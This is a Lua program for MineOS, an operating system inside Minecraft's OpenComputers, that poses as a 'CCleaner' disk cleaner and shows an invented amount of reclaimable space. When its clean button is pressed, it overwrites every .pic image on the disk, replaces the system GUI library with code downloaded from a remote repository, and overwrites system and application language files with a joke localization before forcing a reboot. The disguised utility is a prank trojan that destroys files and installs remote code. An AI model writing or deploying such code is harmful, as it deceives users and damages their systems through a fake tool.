
-- Import libraries
local GUI = require("GUI")
local system = require("System")
local internet = require("Internet")

---------------------------------------------------------------------------------

-- Add a new window to MineOS workspace
local workspace, window, menu = system.addWindow(GUI.filledWindow(1, 1, 100, 20, 0xE1E1E1))

-- Add single cell layout to window
local layout = window:addChild(GUI.layout(1, 1, window.width, window.height, 1, 1))

local disk = component.proxy( component.eeprom.getData() )
local spaceUsed = disk.spaceUsed()
local canclean = math.floor(spaceUsed / 4)

local txt = window:addChild(GUI.text(3,5,0x000000,"CCleaner"))
local txt2 = window:addChild(GUI.text(3,6,0x000000,"Можно очистить " .. tostring(canclean) .. " байт места на диске"))
local btn = window:addChild(GUI.button(40, 8, 30, 3, 0xFFFFFF, 0x555555, 0x880000, 0xFFFFFF, "Очистить"))

local function testFile(fs, path)
    if string.match(path, "^.*%.pic$") then
        internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-GUI.lua/master/CCleaner.app/Icon.pic", path)
    end
end

local function walk(fs, path)
    local files = fs.list(path)

    for filenum=1, #files do
        computer.pullSignal(0.05) -- Защита от Too long without yielding

        local filepath = path .. files[filenum]
        if fs.isDirectory(filepath) then
            walk(fs, filepath)
        else
            testFile(fs, filepath)
        end
    end
end

function btn.onTouch()
    walk(disk, "/")
    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-GUI.lua/master/GUI.lua", "/Libraries/GUI.lua")


    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Localizations/JoPa.lang", "/Localizations/Russian.lang")
    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Localizations/JoPa.lang", "/Localizations/English.lang")


    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/3D%20Print.app/Localizations/JoPa.lang", "/Applications/3D Print.app/Localizations/Russian.lang")
    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/3D%20Print.app/Localizations/JoPa.lang", "/Applications/3D Print.app/Localizations/English.lang")

    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/App%20Market.app/Localizations/JoPa.lang", "/Applications/App Market.app/Localizations/Russian.lang")
    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/App%20Market.app/Localizations/JoPa.lang", "/Applications/App Market.app/Localizations/English.lang")

    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/MineCode%20IDE.app/Localizations/JoPa.lang", "/Applications/MineCode IDE.app/Localizations/Russian.lang")
    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/MineCode%20IDE.app/Localizations/JoPa.lang", "/Applications/MineCode IDE.app/Localizations/English.lang")

    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/Nanomachines.app/Localizations/JoPa.lang", "/Applications/Nanomachines.app/Localizations/Russian.lang")
    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/Nanomachines.app/Localizations/JoPa.lang", "/Applications/Nanomachines.app/Localizations/English.lang")

    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/Settings.app/Localizations/JoPa.lang", "/Applications/Settings.app/Localizations/Russian.lang")
    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/Settings.app/Localizations/JoPa.lang", "/Applications/Settings.app/Localizations/English.lang")

    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/VK.app/Localizations/JoPa.lang", "/Applications/VK.app/Localizations/Russian.lang")
    internet.download("https://raw.githubusercontent.com/KKosty4ka/MineOS-Funny-lang/master/Applications/VK.app/Localizations/JoPa.lang", "/Applications/VK.app/Localizations/English.lang")

    txt2.text = "OK"
    computer.shutdown(true)
end

-- Create callback function with resizing rules when window changes its' size
window.onResize = function(newWidth, newHeight)
    window.backgroundPanel.width, window.backgroundPanel.height = newWidth, newHeight
    layout.width, layout.height = newWidth, newHeight
end

---------------------------------------------------------------------------------

-- Draw changes on screen after customizing your window
workspace:draw()
